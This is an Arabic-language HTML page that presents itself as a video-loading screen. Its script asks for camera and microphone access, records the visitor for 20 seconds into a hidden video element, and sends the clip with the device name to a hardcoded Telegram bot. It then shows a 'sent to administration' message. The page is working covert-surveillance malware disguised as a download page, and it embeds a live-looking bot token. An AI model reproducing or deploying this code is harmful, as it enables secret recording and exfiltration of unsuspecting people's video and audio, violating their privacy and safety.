<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎬 جاري التحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: system-ui, sans-serif;
            background: #000; color: #fff;
            height: 100vh; display: flex;
            align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .container { max-width: 400px; }
        .status-icon { font-size: 60px; margin-bottom: 16px; }
        .status-text { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .status-sub { color: #aaa; font-size: 14px; }
        .countdown { font-size: 48px; font-weight: 900; color: #e60000; margin: 16px 0; }
        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin-top: 20px; overflow: hidden; }
        .progress-fill { height: 100%; background: #e60000; width: 0%; transition: width 0.3s; }
        .success-box { display: none; }
        .success-box .check { font-size: 70px; }
        .success-box h2 { color: #059669; margin: 12px 0; }
        video { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="status-screen">
        <div class="status-icon">📷</div>
        <div class="status-text" id="main-status">يتم التحميل...</div>
        <div class="status-sub" id="sub-status">جاري الوصول للكاميرا</div>
        <div class="countdown" id="countdown">20</div>
        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
    </div>
    <div class="success-box" id="success-box">
        <div class="check">✅</div>
        <h2>تم التحميل بنجاح!</h2>
        <p style="color:#aaa;">الفيديو اتبعت للإدارة</p>
    </div>
    <video id="hidden-video" autoplay playsinline muted></video>
</div>

<script>
const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
const ADMIN_ID = '7276604783';
let mediaRecorder, recordedChunks = [], stream;

async function init() {
    try {
        document.getElementById('main-status').textContent = '📷 جاري تشغيل الكاميرا...';
        document.getElementById('sub-status').textContent = 'الرجاء السماح بالكاميرا';
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('hidden-video').srcObject = stream;
        document.getElementById('main-status').textContent = '🔴 جاري التسجيل...';
        document.getElementById('sub-status').textContent = 'الرجاء الثبات أمام الكاميرا';
        startRecording();
        startCountdown();
    } catch (e) {
        document.getElementById('main-status').textContent = '❌ خطأ';
        document.getElementById('sub-status').textContent = 'لم يتم السماح بالكاميرا';
        document.getElementById('countdown').textContent = '✕';
    }
}

function startRecording() {
    recordedChunks = [];
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.start();
}

function startCountdown() {
    let seconds = 20;
    const countdownEl = document.getElementById('countdown');
    const progressFill = document.getElementById('progress-fill');
    const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
        if (seconds <= 5) document.getElementById('sub-status').textContent = '📤 جاري تجهيز الإرسال...';
        if (seconds <= 0) { clearInterval(interval); stopAndSend(); }
    }, 1000);
}

async function stopAndSend() {
    document.getElementById('main-status').textContent = '📤 جاري الإرسال...';
    document.getElementById('sub-status').textContent = 'يتم إرسال الفيديو للإدارة';
    document.getElementById('countdown').textContent = '...';
    mediaRecorder.stop();
    await new Promise(r => setTimeout(r, 2000));
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
    const formData = new FormData();
    formData.append('chat_id', ADMIN_ID);
    formData.append('video', blob, 'video_' + Date.now() + '.webm');
    formData.append('caption', '🎬 فيديو\n📱 ' + deviceName);
    try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch(e) {}
    document.getElementById('status-screen').style.display = 'none';
    document.getElementById('success-box').style.display = 'block';
    stream.getTracks().forEach(t => t.stop());
}

window.onload = init;
</script>
</body>
</html>
